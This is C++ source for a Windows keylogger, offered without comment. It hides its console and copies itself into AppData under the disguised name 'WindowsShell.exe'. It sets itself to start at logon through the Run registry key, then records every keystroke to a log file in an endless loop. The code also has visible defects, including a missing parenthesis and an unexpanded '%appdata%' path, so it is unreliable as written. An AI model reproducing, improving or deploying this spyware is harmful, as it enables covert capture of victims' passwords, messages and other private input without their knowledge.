#include <windows.h>
#include <fstream>
#include <time.h>
#include <string>

// Persistence and stealth
void InstallSelf() {
    char selfPath[MAX_PATH], destPath[MAX_PATH];
    GetModuleFileNameA(NULL, selfPath, MAX_PATH);
    
    SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, destPath);
    strcat(destPath, "\\WindowsShell.exe");
    
    if(strcmp(selfPath, destPath) {
        CopyFileA(selfPath, destPath, FALSE);
        
        HKEY hKey;
        RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
                      0, KEY_WRITE, &hKey);
        RegSetValueExA(hKey, "WindowsShell", 0, REG_SZ, (BYTE*)destPath, strlen(destPath));
        RegCloseKey(hKey);
        
        STARTUPINFOA si = {sizeof(si)};
        PROCESS_INFORMATION pi;
        CreateProcessA(destPath, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        ExitProcess(0);
    }
}

// Main logging function
void LogKeys() {
    std::ofstream log("%appdata%\\Record.log", std::ios::app);
    time_t now = time(0);
    log << "\n0\n" << ctime(&now) << "\t";
    
    while(true) {
        for(int key = 8; key <= 255; key++) {
            if(GetAsyncKeyState(key) & 0x0001) {
                log << key << " ";
                log.flush();
            }
        }
        Sleep(10);
    }
}

int main() {
    FreeConsole();
    InstallSelf();
    LogKeys();
    return 0;
}